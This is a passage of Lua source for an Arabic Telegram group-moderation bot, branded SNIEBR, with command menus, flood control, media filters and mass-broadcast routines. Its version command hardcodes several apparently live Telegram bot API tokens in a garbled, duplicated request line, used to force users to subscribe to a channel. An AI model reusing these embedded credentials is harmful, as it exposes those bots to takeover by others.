🚸| ارسل امر (سمايلات) لبدء لعبه
🚸| ارسل امر (حزوره) لبدء لعبه
🚸| ارسل امر (المعاني) لبدء لعبه
🚸| ارسل امر (العكس) لبدء لعبه
🚸| ارسل امر (بات) لبدء لعبه
🚸| ارسل امر (خمن) لبدء لعبه
🚸| ارسل امر (امثله) لبدء لعبه
🚸| ارسل امر (المختلف) لبدء لعبه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
Ch  ☰ * @SNIEBR 🃏
]], 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_,true)  
end
if text == 'الالعاب' and (is_owner(msg) or is_creatorbasic(msg)) then   
send(msg.chat_id_, msg.id_, 1,[[*
✔️| اهلا بك في الالعاب  
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📋| الالعاب المتاحه لديك هي ↓
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🚸| ارسل امر (الاسرع) لبدء لعبه
🚸| ارسل امر (سمايلات) لبدء لعبه
🚸| ارسل امر (حزوره) لبدء لعبه
🚸| ارسل امر (المعاني) لبدء لعبه
🚸| ارسل امر (العكس) لبدء لعبه
🚸| ارسل امر (بات) لبدء لعبه
🚸| ارسل امر (خمن) لبدء لعبه
🚸| ارسل امر (امثله) لبدء لعبه
🚸| ارسل امر (المختلف) لبدء لعبه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
Ch  ☰ * @SNIEBR 🃏
]], 1, 'md')
end
if text == 'تعطيل اللعبه' and (is_owner(msg) or is_creatorbasic(msg)) then  
taha = '❗️※ تم تعطيل اللعبه  ✓' 
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'lock_geam'..msg.chat_id_) 
end

----------------
if text:match("^الاوامر$") and (is_mod(msg) or is_creatorbasic(msg)) then
local help = redis:get('SNIEBR:'..bot_id..'help')
local text =  [[
📮┇هناك {4} اوامر لعرضها
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🗑┇م1 ~⪼ لعرض اوامر الحمايه
📚┇م2 ~⪼ لعرض اوامر الادمنيه
🗓┇م3 ~⪼ لعرض اوامر المدراء
🎖┇م4 ~⪼ لعرض اوامر المطورين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
‏📡┇Ch ~⪼ @SNIEBR
]]
send(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if (text and text == 'تغير امر م1') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h11'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'h11'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h11'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'h1', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م1$") or text == "م١") and (is_mod(msg) or is_creatorbasic(msg)) then
local h1 = redis:get('SNIEBR:'..bot_id..'h1')
local text =  [[
📮┇ اوامر حمايه المجموعه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⏺┇قفل/فتح + الاوامر الادناه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🔐┇الكل
🔐┇الروابط
🔐┇المعرف
🔐┇التاك
🔐┇الشارحه
🔐┇التعديل
🔐┇التثبيت
🔐┇المتحركه
🔐┇الملفات
🔐┇الصور
🔐┇الملصقات
🔐┇الفيديو
🔐┇الانلاين
🔐┇الدردشه
🔐┇التوجيه
🔐┇الاغاني
🔐┇الصوت
🔐┇الجهات
🔐┇الاشعارات
🔐┇الماركدون
🔐┇البوتات
🔐┇العربيه
🔐┇الانكليزية
🔐┇الميديا
🔐┇التكرار
🔐┇الكلايش
🔐┇الدخول
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📡┇Ch ~⪼ @SNIEBR
]]
send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
end
if (text and text == 'تغير امر م2') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h22'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'h22'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h22'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'h2', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م2$") or text == "م٢") and (is_mod(msg) or is_creatorbasic(msg)) then
local h2 = redis:get('SNIEBR:'..bot_id..'h2')
local text =  [[
🥈┇اوامر الادمنيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🚫┇كتم
🚷┇حظر
🚷┇طرد
🚫┇منع ثم ارسل الكلمه والتحذير
🚫┇منع بالرد على الميديا
⏺┇الغاء حظر
⏺┇الغاء كتم
⏺┇الغاء منع ثم ارسل الكلمه
⏺┇الغاء منع بالرد على الميديا
📋┇المحظورين  
📋┇المكتومين
📋┇قائمه المنع
ℹ️┇تثبيت
⏺┇الغاء تثبيت
📄┇الاعدادات
🗳┇الرابط
📃┇القوانين
👋🏻┇وضع/حذف/جلب الترحيب
👋🏻┇تفعيل/تعطيل الترحيب
⚠️┇تفعيل/تعطيل الابلاغ
⚠️┇تعين عدد الابلاغ + العدد
📡┇معلومات + ايدي
📲┇الحساب + ايدي
📣┇كرر + الكلمه
💭┇ايدي
💭┇جهاتي
💭┇سحكاتي
💭┇رسائلي
💭┇ابلاغ
💭┇عدد الكروب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🔘┇وضع + الاوامر الادناه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📝┇اسم
📝┇رابط
📝┇صوره
📝┇وصف
📝┇قوانين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🗑┇مسح + الاوامر الادناه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📮┇قائمه المنع
📮┇المحظورين
📮┇المكتومين
📮┇القوانين
📮┇البوتات
📮┇الصوره
📮┇الرابط
📮┇قائمه منع المتحركات
📮┇قائمه منع الملصقات
📮┇قائمه منع الصور
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📡┇Ch ~⪼ @SNIEBR
]]
send(msg.chat_id_, msg.id_, 1, (h2 or text), 1, 'html')
end
if (text and text == 'تغير امر م3') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h33'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'h33'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h33'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'h3', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
if (text:match("^م3$") or text == "م٣") and (is_mod(msg) or is_creatorbasic(msg)) then
local h3 = redis:get('SNIEBR:'..bot_id..'h3')
local text =  [[
🥇┇ اوامر المدراء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🔘┇وضع :- مع الاوامر ادناه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🔢┇تكرار + العدد
⏺┇زمن التكرار + العدد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↕️┇رفع/تنزيل ادمن
↕️┇رفع/تنزيل عضو مميز
↕️┇منح/الغاء منح الحظر
💬┇تفعيل/تعطيل الايدي بالصوره
💬┇تفعيل/تعطيل الايدي
💬┇تفعيل/تعطيل ردود المطور
💬┇تفعيل/تعطيل ردود المدير
💬┇تفعيل/تعطيل التثبيت
💬┇تفعيل/تعطيل اطردني
🖇┇رفع الادمنيه
🖇┇اضف/حذف رد
📋┇الادمنيه
📋┇قائمه صلاحيه الحظر
📋┇ردود المدير
📋┇ادمنيه المجموعه
📋┇الاعضاء المميزين
🗑┇تنظيف + عدد
🗑┇مسح الادمنيه
🗑┇مسح ردود المدير
🗑┇مسح الاعضاء المميزين
🗑┇مسح صلاحية الحظر
🗑┇تنظيف قائمه المحظورين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🏅┇اوامر المنشئين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↕️┇رفع/تنزيل مدير
📋┇المدراء
🗑┇مسح المدراء
🚫┇طرد المحذوفين
🚫┇طرد المتروكين
🗑┇تنظيف قائمه المحظورين
🔘┇تعين/مسح الايدي
📎┇اضف/مسح صلاحيه
➕┇اضف/مسح امر + اسم الامر
🖲┇تفعيل/تعطيل الاعلانات
🚸┇تفعيل/تعطيل الطرد/الحظر
💭┇اضف/حذف امر + اسم الامر
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📡┇Ch ~⪼ @SNIEBR
]]
send(msg.chat_id_, msg.id_, 1, (h3 or text), 1, 'html')
end
if (text and text == 'تغير امر م4') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h44'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko2 = redis:get('SNIEBR:'..bot_id..'h44'..msg.sender_user_id_..'')
if keko2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('SNIEBR:'..bot_id..'h44'..msg.sender_user_id_..'', 'no')
redis:set('SNIEBR:'..bot_id..'h4', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return
false
end
end
if (text:match("^م4$") or text == "م٤") and is_sudo(msg) then
local h4 = redis:get('SNIEBR:'..bot_id..'h4')
local text =  [[
🎖┇اوامر المطور
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
✳️┇تفعيل/تعطيل
⏺┇تفعيل/تعطيل المغادره
⏺┇تفعيل/تعطيل الاذاعه
⏺┇تفعيل/تعطيل البوت خدمي
🔘┇وضع وقت + عدد
🔘┇المده1 + id
🔘┇المده2 + id
🔘┇المده3 + id
🔘┇وقت المجموعه + id
🔘┇مغادره + id
🔘┇مغادره
🔘┇اضف/مسح رد للكل
📋┇ردود المطور
🔘┇تغير اسم البوت 
🔘┇تغير/مسح امر المطور بالكليشه
🔘┇تعين/مسح مجموعه المطور
📄┇عدد الكروبات/الاحصائيات
📋┇روابط الكروبات
🚫┇حظر عام
⏺┇الغاء العام
🚫┇كتم عام
⏺┇الغاء كتم العام
📋┇قائمه العام
📋┇المكتومين عام
↕️┇اضف/حذف مطور
↕️┇رفع/تنزيل مدير
↕️┇رفع/تنزيل منشئ اساسي 
📋┇المدراء
📋┇المنشئين
📋┇المنشئين الاساسين
📋┇المطورين
🗑┇استعاده الاوامر
🗑┇مسح ردود المطور
🗑┇مسح المطورين
🗑┇مسح قائمه العام
🗑┇مسح المدراء
🗑┇مسح المنشئين
🗑┇مسح الاساسين
🗑┇مسح المكتومين عام
🏷┇تغير امر {الاوامر ، م1 ، م2 ، م3 ، م4}
🏷┇مشاهده منشور
🏷┇اذاعه+ توجيه للكل بلرد 
🏷┇اذاعه خاص 
🏷┇تنظيف المشتركين
🏷┇تنظيف المجموعات
🗂┇الملفات
🗂┇تفعيل/تفعيل ملف + اسم الملف
🗂┇اضف/حذف/جلب ملف + اسم الملف
🗂┇مسح جميع الملفات
🗯┇تغير نص الانلاين + النص
🗯┇تغير رابط الانلاين + الرابط
🗯┇تفعيل/تعطيل الانلاين
🗯┇فحص البوت
🗯┇تغير اسم البوت
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
‏📡┇Ch ~⪼ @SNIEBR
]]
send(msg.chat_id_, msg.id_, 1, (h4 or text), 1, 'html')
end
if text:match("^اصدار$") or text:match("^الاصدار$") or text:match("^السورس$") or text:match("^سورس$") then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
local text =  [[
👋┇اهلا بك في سورس سنايبر 

🌐┇<strong>SNIEBR TEAM</strong>

🦁┇<a href="https://telegram.me/SNIEBR">قناه السورس</a>
🦁┇<a href="https://t.me/SNIEBR">شروحات السورس</a>
]]
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^اريد رابط حذف$") or text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^الرابط حذف$") or text:match("^اريد رابط الحذف$") then
local text =  [[
🗑┇رابط حذف التلي ، ⬇
‼┇احذف ولا ترجع عيش حياتك'
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🔎┇<a href="https://telegram.org/deactivate">اضغط هنا للحذف الحساب" </a>
]]
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
end
function tdcli_update_callback(data)
local chat = {}
if (data.ID == "UpdateNewMessage") then
local Data_SNIEBR = data
msg = data.message_
text = msg.content_.text_
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print('OLD MESSAGE')
return false
end
                        -------------------------
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
datahmade:hset('SNIEBR:'..bot_id..'user:'..msg.sender_user_id_,'username',(data.username_ or msg.sender_user_id_))
print('Save User : @'..data.username_ or '')
end;end,nil)
			-------------------------
if datahmade:get('SNIEBR:'..bot_id.."charge:"..msg.chat_id_) then
datahmade:sadd("thsake:good"..bot_id..os.date("%d"),msg.chat_id_)
datahmade:del("thsake:good"..bot_id..( tonumber(os.date("%d")) - 1) )
if (not is_mod(msg) and not is_vip(msg)  and not is_creatorbasic(msg) ) then 
print("»» is member "..msg.sender_user_id_) 
if is_muted(msg.sender_user_id_, msg.chat_id_) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "SNIEBR"
end
z_SNIEBR = TSCheckMsg(msg)
if z_SNIEBR and z_SNIEBR == "stop" then 
if msg.content_.ID == "MessageChatAddMembers" then
if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
if datahmade:get("lock_bot:SNIEBR"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
end
if datahmade:get("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
end
end
end
if datahmade:get("lock_lllll:SNIEBR"..msg.chat_id_..bot_id) then
local hash = 'flood:max:'..bot_id..msg.chat_id_
if not datahmade:get(hash) then
floodMax = 10
else
floodMax = tonumber(datahmade:get(hash))
end
local hash = 'SNIEBR:'..bot_id..'flood:time:'..msg.chat_id_
if not datahmade:get(hash) then
floodTime = 1
else
floodTime = tonumber(datahmade:get(hash))
end
if not is_vip(msg) then
if bot_id then
if not is_vip(msg) then
local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
local msgs = tonumber(datahmade:get(hash) or 0)
if msgs > (floodMax - 1) then
local user = msg.sender_user_id_
local chat = msg.chat_id_
local channel = msg.chat_id_
local user_id = msg.sender_user_id_
local banned = is_banned(user_id, msg.chat_id_)
if banned then
else
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
user_id = msg.sender_user_id_
o = datahmade:get("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
if (o and (tonumber(o) >= 5)) then
datahmade:set("lock_media:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_note:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_word:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_mark:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_link:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_new:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set('SNIEBR:'..bot_id..'get:photo'..msg.chat_id_,true)
send(msg.chat_id_, 0, 1, '⚠️┇تم كشف عمليه تخريب في المجموعة \n‼️┇وتم قفل الميديا وسيتم طرد جميع الاشخاص الذين يقومون بعمل تكرار', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🎫┇الايدي ~⪼*('..msg.sender_user_id_..')* \n❕┇قمت بعمل تكرار للرسائل المحدده\n☑┇وتم كتمك في المجموعه\n', 1, 'md')
end 
if (o and (tonumber(o) > 5)) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
local msgm = msg.id_
for i=1,tonumber(num) do
delete_msg(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
end
datahmade:incr("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
datahmade:sadd('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
end
end
datahmade:setex(hash, floodTime, msgs+1)
end
end
end
end
return "SNIEBR"
end
end
if data.message_.content_.text_ then   
if datahmade:get("SNIEBR:edit:text:su:newamr2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_) then
local SNIEBR_edit_text = datahmade:get("SNIEBR:edit:text:su:newamr2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_)
print(SNIEBR_edit_text)
if SNIEBR_edit_text then
data.message_.content_.text_ = (SNIEBR_edit_text or data.message_.content_.text_)
end
end
end
local msg = data.message_
text = msg.content_.text_

------------------
if msg.content_.ID == 'MessageSticker' and not is_owner(msg) then 
local filter = datahmade:smembers('SNIEBR:'..bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
function get_info(arg,data)
if data.username_ ~= false then
send(msg.chat_id_,0, 1, "⚠┇عذرا يا » { (@"..data.username_..")}\n📛┇ الملصق الذي ارسلته تم منعه من المجموعه \n" , 1, 'html') 
else
send(msg.chat_id_,0, 1, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/SNIEBR)}\n📛┇ الملصق الذي ارسلته تم منعه من المجموعه \n" , 1, 'md') 
end
end
getUser(msg.sender_user_id_,get_info)
delete_msg(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
if msg.content_.ID == 'MessagePhoto' and not is_owner(msg) then 
local filter = datahmade:smembers('SNIEBR:'..bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
function get_info(arg,data)
if data.username_ ~= false then
send(msg.chat_id_,0, 1, "⚠┇عذرا يا » { (@"..data.username_..")}\n📛┇ الصوره التي ارسلتها تم منعها من المجموعه \n" , 1, 'html') 
else
send(msg.chat_id_,0, 1, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/SNIEBR)}\n📛┇ الصوره التي ارسلتها تم منعها من المجموعه \n" , 1, 'md') 
end
end
getUser(msg.sender_user_id_,get_info)
delete_msg(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
if msg.content_.ID == 'MessageAnimation' and not is_owner(msg) then 
local filter = datahmade:smembers('SNIEBR:'..bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
function get_info(arg,data)
if data.username_ ~= false then
send(msg.chat_id_,0, 1, "⚠┇عذرا يا » { (@"..data.username_..")}\n📛┇ المتحركه التي ارسلتها تم منعها من المجموعه \n" , 1, 'html') 
else
send(msg.chat_id_,0, 1, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/SNIEBR)}\n📛┇ المتحركه التي ارسلتها تم منعها من المجموعه \n" , 1, 'md') 
end
end
getUser(msg.sender_user_id_,get_info)
delete_msg(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------
if datahmade:get('SNIEBR:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
send(msg.chat_id_, msg.id_, 1, "*📬┇ تم الغاء الاذاعه للمشتركين *\n", 1, "md") 
datahmade:del('SNIEBR:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
else 
----------
local pv = datahmade:smembers('SNIEBR:'..bot_id.."userss")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
end,nil)
end
----------
local gps = datahmade:scard('SNIEBR:'..bot_id.."userss") or 0 
if msg.content_.text_ then
whatbc = 'الرساله'
local list = datahmade:smembers('SNIEBR:'..bot_id..'userss') 
for k,v in pairs(list) do 
send(v, 0, 1, '[ '..msg.content_.text_..' ]', 1, 'md')  
end
elseif msg.content_.photo_ then
whatbc = 'الصور'
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
local list = datahmade:smembers('SNIEBR:'..bot_id..'userss') 
for k,v in pairs(list) do 
tdcli.sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
whatbc = 'المتحركه'
local list = datahmade:smembers('SNIEBR:'..bot_id..'userss') 
for k,v in pairs(list) do 
tdcli.sendDocument(v, 0,0, 1, nil, msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
whatbc = 'الملصق'
local list = datahmade:smembers('SNIEBR:'..bot_id..'userss') 
for k,v in pairs(list) do 
tdcli.sendSticker(v, 0,0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
end 
end
send(msg.chat_id_, msg.id_, 1, '☑┇تم نشر الرساله الى {'..(gps)..'} مشترك ', 1, 'md')
datahmade:del('SNIEBR:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end 
------------------
if is_sudo(msg) then 
if datahmade:get("SNIEBR:set_if_bc_new:"..bot_id..msg.sender_user_id_) then 
if text and text:match("^الغاء$") or text and text:match("^الغاء ✖$") then   
datahmade:del("SNIEBR:set_if_bc_new:"..bot_id..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الاذاعه  *\n✓", 1, "md") 
else
local group = datahmade:smembers('SNIEBR:'..bot_id..'groups') 
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data) end,nil)end
datahmade:del("SNIEBR:set_if_bc_new:"..bot_id..msg.sender_user_id_)
local pro = datahmade:scard('SNIEBR:'..bot_id..'pro:groups') or 0
if text then 
local gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
for i=1, #gpss do
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups', gpss[i]) then
send(gpss[i], 0, 1, text, 1, 'html')		
end					
end
end
if (data.message_.content_.sticker_) then 
gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
for i=1, #gpss do
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendSticker(gpss[i], 0,0, 1, nil, data.message_.content_.sticker_.sticker_.persistent_id_)
end
end
elseif (data.message_.content_.voice_) then 
gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
for i=1, #gpss do
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendVoice(gpss[i], 0,0, 1, nil, data.message_.content_.voice_.voice_.persistent_id_)
end
end
elseif (data.message_.content_.video_) then 
gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
for i=1, #gpss do
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendVideo(gpss[i], 0,0, 1, nil, data.message_.content_.video_.video_.persistent_id_)
end
end
elseif (data.message_.content_.animation_) then 
gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
for i=1, #gpss do
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.animation_.animation_.persistent_id_)
end
end
elseif (data.message_.content_.document_) then
gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
for i=1, #gpss do
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendDocument(gpss[i], 0,0, 1, nil, data.message_.content_.document_.document_.persistent_id_)
end
end
elseif (data.message_.content_.photo_) then
local id_keko = nil
if data.message_.content_.photo_.sizes_[0] then
id_keko = data.message_.content_.photo_.sizes_[0].photo_.persistent_id_
end
if data.message_.content_.photo_.sizes_[1] then
id_keko = data.message_.content_.photo_.sizes_[1].photo_.persistent_id_
end
if data.message_.content_.photo_.sizes_[2] then
id_keko = data.message_.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if data.message_.content_.photo_.sizes_[3] then
id_keko = data.message_.content_.photo_.sizes_[3].photo_.persistent_id_
end
gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
for i=1, #gpss do
if not datahmade:sismember('SNIEBR:'..bot_id..'pro:groups', gpss[i]) then
tdcli.sendPhoto(gpss[i], 0, 0, 1, nil, id_keko,(msg.content_.caption_ or " "))
end					
end
end
gpss = datahmade:smembers( 'SNIEBR:'..bot_id.."groups") or 0
send(msg.chat_id_, msg.id_, 1, '☑┇تم نشر الرساله في {'..(#gpss - pro)..'} مجموعه ', 1, 'md')
end
end
end
local keko1 = redis:get('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
if keko1 == 're' then
local keko2 = redis:get('SNIEBR:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'')
if text then 
redis:set('SNIEBR:'..bot_id..'keko'..keko2..''..msg.chat_id_..'', text)
elseif (data.message_.content_.sticker_) then 
redis:set('SNIEBR:'..bot_id..':sticker:'..keko2..''..msg.chat_id_..'', data.message_.content_.sticker_.sticker_.persistent_id_)
elseif (data.message_.content_.voice_) then 
redis:set('SNIEBR:'..bot_id..':voice:'..keko2..''..msg.chat_id_..'', data.message_.content_.voice_.voice_.persistent_id_)
elseif (data.message_.content_.video_) then 
redis:set('SNIEBR:'..bot_id..':video:'..keko2..''..msg.chat_id_..'', data.message_.content_.video_.video_.persistent_id_)
elseif (data.message_.content_.animation_) then 
redis:set('SNIEBR:'..bot_id..':gif:'..keko2..''..msg.chat_id_..'', data.message_.content_.animation_.animation_.persistent_id_)
elseif (data.message_.content_.document_) then
redis:set('SNIEBR:'..bot_id..':file:'..keko2..''..msg.chat_id_..'', data.message_.content_.document_.document_.persistent_id_)
else
end -- end if text 
redis:sadd('SNIEBR:'..bot_id..'kekore'..msg.chat_id_..'', keko2)
send(msg.chat_id_, msg.id_, 1, "📊┇ تم حفظ الرد  ", 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
return false

end
local keko1 = redis:get('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'')
if keko1 == 're' then
